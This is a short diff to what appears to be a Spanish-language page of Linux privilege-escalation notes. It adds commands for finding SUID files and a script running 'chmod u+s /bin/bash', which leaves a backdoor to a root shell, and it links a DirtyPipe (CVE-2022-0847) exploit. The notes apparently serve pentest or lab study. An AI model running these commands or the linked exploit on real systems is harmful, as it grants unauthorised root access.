@@ -45,9 +45,18 @@ Para buscar ficheros con permisos suid
 <pre>
 
 find / -perm -u=s -type f 2>/dev/null
+find \-perm -4000 2>/dev/null
+
 
 </pre>
 
+Permisos de superusuario a la consola:
+
+<pre>
+#!/bin/bash
+
+chmod u+s /bin/bash
+</pre>
 Al tener pkexec utilizamos:
 
 https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
